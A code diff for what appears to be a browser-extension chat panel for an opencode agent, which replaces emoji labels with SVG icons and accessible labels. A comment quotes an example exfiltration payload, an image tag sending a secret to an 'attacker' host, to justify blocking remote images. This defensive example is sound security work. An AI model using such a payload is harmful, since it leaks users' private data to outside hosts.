@@ -4,6 +4,10 @@ I18N.ready.then(function() {
   //  - 원격 이미지는 불러오지 않고 링크로 바꾼다: <img src="https://attacker/?d=비밀">로
   //    사용자 동작 없이 데이터를 내보내는 경로를 막는다(manifest CSP img-src도 같이 막음).
   //  - 링크는 http(s)/mailto만 남기고 새 탭으로 연다(사이드패널 자체가 이동하지 않게).
+  // 전송/중단 버튼 아이콘(정적 문자열)
+  const SEND_ICON_SVG = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7"/></svg>';
+  const STOP_ICON_SVG = '<svg width="14" height="14" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="6" width="12" height="12" rx="2.5" fill="currentColor"/></svg>';
+
   const MD_SANITIZE_CONFIG = {
     FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select', 'option',
       'iframe', 'frame', 'frameset', 'object', 'embed', 'base', 'link', 'meta', 'svg', 'math', 'video', 'audio', 'source'],
@@ -381,14 +385,11 @@ I18N.ready.then(function() {
     if (welcome) welcome.remove();
 
     const div = document.createElement('div');
-    div.className = 'message bot-message';
+    div.className = 'message page-note';
     div.innerHTML = `
-      <div class="message-avatar">🌐</div>
-      <div class="message-content">
-        <strong>${escapeHtml(title)}</strong><br>
-        <small style="opacity:0.6;word-break:break-all">${escapeHtml(url)}</small><br><br>
-        이 페이지에 대해 요약, 설명, 검색 등을 요청해보세요.
-      </div>
+      <div class="page-note-title">${escapeHtml(title)}</div>
+      <div class="page-note-url">${escapeHtml(url)}</div>
+      <div class="page-note-hint">${escapeHtml(t('이 페이지에 대해 요약, 설명, 검색 등을 요청해보세요.'))}</div>
     `;
     messagesContainer.insertBefore(div, messagesContainer.firstChild);
     scrollToBottom();
@@ -396,15 +397,11 @@ I18N.ready.then(function() {
 
   function addPageChangedMessage(title, url) {
     const div = document.createElement('div');
-    div.className = 'message bot-message';
+    div.className = 'message page-note changed';
     div.innerHTML = `
-      <div class="message-avatar">🌐</div>
-      <div class="message-content">
-        페이지가 변경된 것을 확인했어요.<br>
-        <strong>${escapeHtml(title)}</strong><br>
-        <small style="opacity:0.6;word-break:break-all">${escapeHtml(url)}</small><br><br>
-        이 세션은 이전 페이지에서 이어지는 대화입니다.
-      </div>
+      <div class="page-note-hint">${escapeHtml(t('페이지가 변경되었습니다. 이 세션은 이전 페이지에서 이어지는 대화입니다.'))}</div>
+      <div class="page-note-title">${escapeHtml(title)}</div>
+      <div class="page-note-url">${escapeHtml(url)}</div>
     `;
     messagesContainer.appendChild(div);
     scrollToBottom();
@@ -981,7 +978,7 @@ I18N.ready.then(function() {
         const item = document.createElement('div');
         item.className = 'message-attachment-item';
         item.title = filePath;
-        item.textContent = '📎 ' + (filePath.replace(/\\/g, '/').split('/').pop() || filePath);
+        item.textContent = (filePath.replace(/\\/g, '/').split('/').pop() || filePath);
         list.appendChild(item);
       });
       contentDiv.appendChild(list);
@@ -1626,7 +1623,7 @@ I18N.ready.then(function() {
       </details>
       <div class="mcp-actions">
         <button id="settings-hard-restart-btn" class="mcp-action-btn danger"${dis}
-                title="${t('opencode 서버 프로세스를 종료하고 다시 시작합니다')}">${t('⚡ 서버 강제 재시작')}</button>
+                title="${t('opencode 서버 프로세스를 종료하고 다시 시작합니다')}">${t('서버 강제 재시작')}</button>
         <div id="settings-action-status" class="mcp-action-status hidden"></div>
       </div>
       <div class="settings-section">
@@ -1865,7 +1862,8 @@ I18N.ready.then(function() {
       const src = img.getAttribute('src') || '';
       if (/^data:image\//i.test(src)) continue;
       const a = document.createElement('a');
-      a.textContent = `🖼 ${img.getAttribute('alt') || src}`;
+      a.className = 'md-img-link';
+      a.textContent = img.getAttribute('alt') || src;
       if (/^https?:/i.test(src)) {
         a.href = src;
         a.target = '_blank';
@@ -1965,11 +1963,13 @@ I18N.ready.then(function() {
     isLoading = loading;
     if (loading) {
       sendBtn.disabled = false;
-      sendBtn.textContent = '■';
+      sendBtn.innerHTML = STOP_ICON_SVG;
+      sendBtn.setAttribute('aria-label', t('중단'));
       sendBtn.classList.add('cancel-mode');
       loadingIndicator.classList.remove('hidden');
     } else {
-      sendBtn.textContent = '↑';
+      sendBtn.innerHTML = SEND_ICON_SVG;
+      sendBtn.setAttribute('aria-label', t('보내기'));
       sendBtn.classList.remove('cancel-mode');
       updateSendButtonState();
       loadingIndicator.classList.add('hidden');
@@ -2148,7 +2148,7 @@ I18N.ready.then(function() {
 
   function buildPermissionCard(part) {
     const el = interactionCardShell(
-      t('🔐 권한 요청: {permission}', { permission: part.permission || '?' }),
+      t('권한 요청: {permission}', { permission: part.permission || '?' }),
       part.fromSubagent ? t('하위 에이전트의 요청입니다.') : ''
     );
     if (part.patterns?.length) {
@@ -2169,7 +2169,7 @@ I18N.ready.then(function() {
       }));
       buttons.appendChild(b);
     };
-    mk(t('한 번 허용'), 'once');
+    mk(t('한 번 허용'), 'once', 'primary');
     mk(t('항상 허용'), 'always', '', part.always?.length ? part.always.join('\n') : '');
     mk(t('거부'), 'reject', 'danger');
     el.appendChild(buttons);
@@ -2178,7 +2178,7 @@ I18N.ready.then(function() {
   }
 
   function buildQuestionCard(part) {
-    const el = interactionCardShell(t('❓ 에이전트의 질문'), part.fromSubagent ? t('하위 에이전트의 요청입니다.') : '');
+    const el = interactionCardShell(t('에이전트의 질문'), part.fromSubagent ? t('하위 에이전트의 요청입니다.') : '');
     const readers = []; // 질문별 선택값을 읽는 함수
     (part.questions || []).forEach((q, qi) => {
       const box = document.createElement('div');
@@ -2222,7 +2222,7 @@ I18N.ready.then(function() {
     const buttons = document.createElement('div');
     buttons.className = 'interaction-buttons';
     const send = document.createElement('button');
-    send.className = 'mcp-action-btn';
+    send.className = 'mcp-action-btn primary';
     send.textContent = t('답변 보내기');
     send.addEventListener('click', () => {
       const answers = readers.map(r => r());
@@ -2352,7 +2352,7 @@ I18N.ready.then(function() {
       el.dataset.blockType = 'tool';
       el.innerHTML = `
         <div class="tool-card-header">
-          <span class="tool-icon">🔧</span>
+          <span class="tool-icon" aria-hidden="true"></span>
           <span class="tool-name"></span>
           <span class="tool-target"></span>
           <span class="tool-status"></span>
@@ -2368,7 +2368,7 @@ I18N.ready.then(function() {
     el.className = 'reasoning-block collapsed';
     el.dataset.blockType = 'reasoning';
     el.innerHTML = `
-      <div class="reasoning-block-header">${t('💭 생각 중')}</div>
+      <div class="reasoning-block-header">${t('생각 중')}</div>
       <div class="reasoning-block-body"></div>
     `;
     makeCollapsible(el, '.reasoning-block-header');
@@ -2446,7 +2446,7 @@ I18N.ready.then(function() {
       const copyBtn = document.createElement('button');
       copyBtn.type = 'button';
       copyBtn.className = 'code-block-copy';
-      copyBtn.textContent = t('📋 복사');
+      copyBtn.textContent = t('복사');
       copyBtn.addEventListener('click', async () => {
         try {
           await navigator.clipboard.writeText(codeEl.textContent);
@@ -2454,7 +2454,7 @@ I18N.ready.then(function() {
         } catch {
           copyBtn.textContent = t('복사 실패');
         } finally {
-          setTimeout(() => { copyBtn.textContent = t('📋 복사'); }, 1500);
+          setTimeout(() => { copyBtn.textContent = t('복사'); }, 1500);
         }
       });
 
@@ -2559,7 +2559,7 @@ I18N.ready.then(function() {
 
       const name = document.createElement('span');
       name.className = 'attachment-chip-name';
-      name.textContent = '📎 ' + (filePath.replace(/\\/g, '/').split('/').pop() || filePath);
+      name.textContent = (filePath.replace(/\\/g, '/').split('/').pop() || filePath);
 
       const removeBtn = document.createElement('button');
       removeBtn.className = 'attachment-chip-remove';
